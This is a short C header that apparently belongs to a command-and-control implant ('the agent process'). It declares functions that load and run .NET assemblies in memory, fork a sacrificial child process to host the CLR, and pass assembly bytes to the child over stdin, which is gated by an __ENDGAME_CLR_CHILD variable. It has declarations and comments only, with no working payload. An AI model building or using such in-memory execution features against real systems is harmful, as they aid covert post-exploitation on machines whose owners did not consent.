#pragma once
#include <stdint.h>
#include <stddef.h>

// Execute a managed .NET assembly in-memory.
// child_mode=0: normal (temp file capture, ExitProcess hook).
// child_mode=1: child process path (pipe is stdout, calls ExitProcess(0) on completion).
// Returns heap-allocated string (caller must free) — only in normal mode.
char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, int child_mode);

// Spawn a sacrificial child process to host the CLR.
// Prevents Environment.Exit() from killing the agent process.
// Returns heap-allocated string with captured output (caller must free).
char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *args, int timeout_sec);

// Called in the child process (when __ENDGAME_CLR_CHILD=1).
// Reads the [4LE args_len][args][4LE asm_len][asm] protocol from stdin,
// runs the CLR, writes output to stdout (pipe), then calls ExitProcess(0).
void clr_child_run(void);
